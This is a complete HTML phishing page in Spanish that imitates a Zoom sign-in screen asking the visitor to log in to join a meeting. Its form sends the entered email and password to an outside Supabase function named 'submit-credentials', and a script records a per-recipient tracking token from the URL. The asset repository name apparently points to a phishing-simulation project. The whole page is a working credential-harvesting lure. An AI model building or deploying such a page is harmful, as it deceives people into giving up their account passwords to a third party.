<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>Zoom - Iniciar sesión</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#f8fafd;font-family:'Open Sans',Arial,sans-serif;color:#232333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#fff;width:100%;max-width:420px;padding:40px 36px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}
  .logo{height:30px;margin-bottom:24px;display:block}
  h1{font-weight:300;font-size:26px;margin:0 0 8px;color:#232333}
  .sub{font-size:14px;color:#747487;margin:0 0 28px}
  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #cfd0d5;border-radius:4px;outline:none;font-family:inherit;margin-bottom:14px}
  input:focus{border-color:#2D8CFF}
  button{display:block;width:100%;background:#2D8CFF;color:#fff;border:none;padding:13px;font-size:15px;font-weight:600;border-radius:4px;cursor:pointer;font-family:inherit;margin-top:10px}
  button:hover{background:#0e72ed}
  .hint{font-size:13px;color:#747487;margin-top:18px;text-align:center}
  a{color:#2D8CFF;text-decoration:none}
  a:hover{text-decoration:underline}
</style></head>
<body>
<div class="box">
  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/zoom.png" alt="Zoom">
  <h1>Confirma tu asistencia</h1>
  <p class="sub">Inicia sesión con tu cuenta de Zoom para unirte a la reunión.</p>
  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
    <input type="hidden" name="token" id="token-field">
    <input type="email" name="email" placeholder="Email" required autofocus>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Iniciar sesión</button>
  </form>
  <p class="hint"><a href="#">¿Olvidaste tu contraseña?</a></p>
</div>
<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
</body></html>
